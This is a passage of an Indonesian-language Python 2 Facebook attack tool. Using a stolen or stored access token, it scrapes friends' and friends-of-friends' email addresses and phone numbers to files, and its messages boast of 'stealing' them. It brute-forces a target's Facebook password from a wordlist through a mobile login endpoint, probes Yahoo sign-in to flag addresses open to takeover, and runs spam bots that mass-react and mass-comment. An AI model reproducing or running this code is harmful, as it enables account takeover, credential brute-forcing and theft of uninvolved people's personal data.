            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Email di dapatkan \x1b[1;96m%s' % len(em)
            print '\x1b[1;91m[+] \x1b[1;97mSukses mencuri email teman...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except KeyError:
            os.remove(mails)
            print '\x1b[1;91m[!] Kesalahan terjadi...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()


def emailfrom_teman():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print random.choice(logo)
            print 40 * '\x1b[1;97m='
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[+] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Belum berteman'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                multi_menu()

            mails = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;93mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil Email teman dari teman \x1b[1;97m...')
            print
            print 40 * '\x1b[1;97m='
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromteman.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 40 * '\x1b[1;97m='
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Email di dapatkan \x1b[1;96m%s' % len(emfromteman)
            print '\x1b[1;91m[+] \x1b[1;97mSukses mencuri email teman dari teman...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except KeyError:
            os.remove(mails)
            print '\x1b[1;91m[!] Kesalahan terjadi...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()


def nomor_hp():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print random.choice(logo)
            print 40 * '\x1b[1;97m='
            noms = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;93mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil Nomor teman \x1b[1;97m...')
            print
            print 40 * '\x1b[1;97m='
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mNomor\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 40 * '\x1b[1;97m='
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah nomor di dapatkan \x1b[1;96m%s' % len(hp)
            print '\x1b[1;91m[+] \x1b[1;97mSukses mencuri nomor telepon teman...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] Kesalahan terjadi...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()


def hpfrom_teman():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print random.choice(logo)
            print 40 * '\x1b[1;97m='
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[+] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Belum berteman'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                multi_menu()

            noms = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;93mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil Nomor teman dari teman \x1b[1;97m...')
            print
            print 40 * '\x1b[1;97m='
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hpfromteman.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mNomor\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 40 * '\x1b[1;97m='
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah nomor di dapatkan \x1b[1;96m%s' % len(hpfromteman)
            print '\x1b[1;91m[+] \x1b[1;97mSukses mencuri nomor telepon teman dari teman...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] Kesalahan terjadi...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()


def brute():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print random.choice(logo)
            print 40 * '\x1b[1;97m='
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;93mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print 40 * '\x1b[1;97m='
            print '\x1b[1;91m[+] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mJumlah\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[?] \x1b[1;92mPastikan koneksi internet anda super greget\x1b[1;97m ...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m%\x1b[1;91m] \x1b[1;92mMencoba \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                    data = requests.get(url)
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        jalan('\n\x1b[1;91m[+]\x1b[1;92m Ditemukan \x1b[1;97m...')
                        print 40 * '\x1b[1;97m='
                        print '\x1b[1;91m[+] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    elif 'www.facebook.com' in mpsh['error_msg']:
                        ceks = open('Brutecekpoint.txt', 'w')
                        ceks.write(email + ' | ' + pw + '\n')
                        ceks.close()
                        jalan('\n\x1b[1;91m[+]\x1b[1;92m Ditemukan \x1b[1;97m...')
                        print 40 * '\x1b[1;97m='
                        print '\x1b[1;91m[?] \x1b[1;93mAkun kena Checkpoint'
                        print '\x1b[1;91m[+] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Koneksi Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan...'
            print '\n\x1b[1;91m[+] \x1b[1;92mSepertinya kamu tidak memiliki wordlist'
            tanyaw()


def tanyaw():
    why = raw_input('\x1b[1;91m[?] \x1b[1;92mIngin membuat wordlist ? \x1b[1;92m[y/n]\x1b[1;91m:\x1b[1;97m ')
    if why == '':
        print '\x1b[1;91m[!] Tolong pilih \x1b[1;97m(y/n)'
        tanyaw()
    elif why == 'y':
        wordlist()
    elif why == 'Y':
        wordlist()
    elif why == 't':
        menu_hack()
    elif why == 'T':
        menu_hack()
    else:
        print '\x1b[1;91m[!] Tolong pilih \x1b[1;97m(y/n)'
        tanyaw()


def menu_yahoo():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m1.\x1b[1;97m Dari teman facebook'
    print '\x1b[1;91m2.\x1b[1;97m Gunakan File'
    print '\x1b[1;91m0.\x1b[1;91m Kembali'
    print
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('\x1b[1;91m>\x1b[1;97m ')
    if go == '':
        print '\x1b[1;91m[!] Jangan kosong'
        yahoo_pilih()
    elif go == '1':
        yahoofriends()
    elif go == '2':
        yahoolist()
    elif go == '0':
        menu_hack()
    else:
        print '\x1b[1;91m[!] \x1b[1;93m' + go + ' \x1b[1;97mTidak ada'
        yahoo_pilih()


def yahoofriends():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    mpsh = []
    jml = 0
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m[+] \x1b[1;92mMembaca Daftar teman\x1b[1;97m ...'
    jalan('\x1b[1;91m[+] \x1b[1;92mMulai\x1b[1;97m ...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('MailVuln.txt', 'w')
    print
    print 40 * '\x1b[1;97m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m[+] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print 40 * '\x1b[1;97m='
                    print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + nama
                    print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;91m[+] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                    print 40 * '\x1b[1;97m='
                else:
                    print '\x1b[1;91m[+] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
        except KeyError:
            pass

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_yahoo()


def yahoolist():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print random.choice(logo)
        print 40 * '\x1b[1;97m='
        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;91m[!] File tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_yahoo()

    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[+] \x1b[1;92mMulai\x1b[1;97m ...')
    save = open('MailVuln.txt', 'w')
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:     \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]     [\x1b[1;92m' + vuln + '\x1b[1;97m]'
    print
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '\x1b[1;91m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;92m ' + mail
            else:
                print '\x1b[1;91m ' + mail

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_yahoo()


def menu_bot():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m1.\x1b[1;97m Bot Reactions Target Post'
    print '\x1b[1;91m2.\x1b[1;97m Bot Reactions Grup Post'
    print '\x1b[1;91m3.\x1b[1;97m Bot Komen Target Post'
    print '\x1b[1;91m4.\x1b[1;97m Bot Komen Grup Post'
    print '\x1b[1;91m5.\x1b[1;97m Mass delete Post'
    print '\x1b[1;91m6.\x1b[1;97m Terima permintaan pertemanan'
    print '\x1b[1;91m7.\x1b[1;97m Hapus pertemanan'
    print '\x1b[1;91m0. Kembali'
    print
    bot_pilih()


def bot_pilih():
    bots = raw_input('\x1b[1;91m>\x1b[1;97m ')
    if bots == '':
        print '\x1b[1;91m[!] Jangan kosong'
        bot_pilih()
    elif bots == '1':
        menu_react()
    elif bots == '2':
        grup_react()
    elif bots == '3':
        bot_komen()
    elif bots == '4':
        grup_komen()
    elif bots == '5':
        deletepost()
    elif bots == '6':
        accept()
    elif bots == '7':
        unfriend()
    elif bots == '0':
        menu()
    else:
        print '\x1b[1;91m[!] \x1b[1;97m' + bots + ' \x1b[1;91mTidak ada'
        bot_pilih()


def menu_react():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m1. \x1b[1;97mLike  \x1b[1;96m(y)'
    print '\x1b[1;91m2. \x1b[1;97mLove  \x1b[1;95m<3'
    print '\x1b[1;91m3. \x1b[1;97mWow   \x1b[1;94m:0'
    print '\x1b[1;91m4. \x1b[1;97mHaha  \x1b[1;93m:v'
    print '\x1b[1;91m5. \x1b[1;97mSedih \x1b[1;96m:('
    print '\x1b[1;91m6. \x1b[1;97mMarah \x1b[1;91m>:('
    print '\x1b[1;91m0. Kembali'
    print
    react_pilih()


def react_pilih():
    global tipe
    aksi = raw_input('\x1b[1;91m>\x1b[1;97m ')
    if aksi == '':
        print '\x1b[1;91m[!] Jangan kosong'
        react_pilih()
    elif aksi == '1':
        tipe = 'LIKE'
        react()
    elif aksi == '2':
        tipe = 'LOVE'
        react()
    elif aksi == '3':
        tipe = 'WOW'
        react()
    elif aksi == '4':
        tipe = 'HAHA'
        react()
    elif aksi == '5':
        tipe = 'SAD'
        react()
    elif aksi == '6':
        tipe = 'ANGRY'
        react()
    elif aksi == '0':
        menu_bot()
    else:
        print '\x1b[1;91m[!] \x1b[1;97m' + bots + ' \x1b[1;91mTidak ada'
        react_pilih()


def react():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print random.choice(logo)
        print 40 * '\x1b[1;97m='
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mMasukan limit \x1b[1;91m:\x1b[1;97m ')
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[+]\x1b[1;92m Mulai\x1b[1;97m ...')
            print
            print 40 * '\x1b[1;97m='
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(reaksi))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()


def grup_react():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m1. \x1b[1;97mLike  \x1b[1;96m(y)'
    print '\x1b[1;91m2. \x1b[1;97mLove  \x1b[1;95m<3'
    print '\x1b[1;91m3. \x1b[1;97mWow   \x1b[1;94m:0'
    print '\x1b[1;91m4. \x1b[1;97mHaha  \x1b[1;93m:v'
    print '\x1b[1;91m5. \x1b[1;97mSedih \x1b[1;96m:('
    print '\x1b[1;91m6. \x1b[1;97mMarah \x1b[1;91m>:('
    print '\x1b[1;91m0. Kembali'
    print
    reactg_pilih()


def reactg_pilih():
    global tipe
    aksi = raw_input('\x1b[1;91m>\x1b[1;97m ')
    if aksi == '':
        print '\x1b[1;91m[!] Jangan kosong'
        reactg_pilih()
    elif aksi == '1':
        tipe = 'LIKE'
        reactg()
    elif aksi == '2':
        tipe = 'LOVE'
        reactg()
    elif aksi == '3':
        tipe = 'WOW'
        reactg()
    elif aksi == '4':
        tipe = 'HAHA'
        reactg()
    elif aksi == '5':
        tipe = 'SAD'
        reactg()
    elif aksi == '6':
        tipe = 'ANGRY'
        reactg()
    elif aksi == '0':
        menu_bot()
    else:
        print '\x1b[1;91m[!] \x1b[1;97m' + bots + ' \x1b[1;91mTidak ada'
        reactg_pilih()


def reactg():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print random.choice(logo)
        print 40 * '\x1b[1;97m='
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mMasukan limit \x1b[1;91m:\x1b[1;97m ')
        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(ah.text)
        print '\x1b[1;91m[+] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
        try:
            oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[+]\x1b[1;92m Mulai\x1b[1;97m ...')
            print
            print 40 * '\x1b[1;97m='
            for a in ah['feed']['data']:
                y = a['id']
                reaksigrup.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(reaksigrup))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()


def bot_komen():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print random.choice(logo)
        print 40 * '\x1b[1;97m='
        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mKomentar  \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mMasukan limit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        try:
            p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[+]\x1b[1;92m Mulai\x1b[1;97m ...')
            print
            print 40 * '\x1b[1;97m='
            for s in a['feed']['data']:
                f = s['id']
                komen.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(komen))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()


def grup_komen():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print random.choice(logo)
        print 40 * '\x1b[1;97m='
        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup  \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mKomentar \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mMasukan limit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
            asw = json.loads(ah.text)
            print '\x1b[1;91m[+] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[+]\x1b[1;92m Mulai\x1b[1;97m ...')
            print
            print 40 * '\x1b[1;97m='
            for s in a['feed']['data']:
                f = s['id']
                komengrup.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(komengrup))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()


def deletepost():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m[+] \x1b[1;92mFrom \x1b[1;91m: \x1b[1;97m%s' % nama
    jalan('\x1b[1;91m[+] \x1b[1;92mMulai menghapus postingan unfaedah\x1b[1;97m ...')
    print
    print 40 * '\x1b[1;97m='
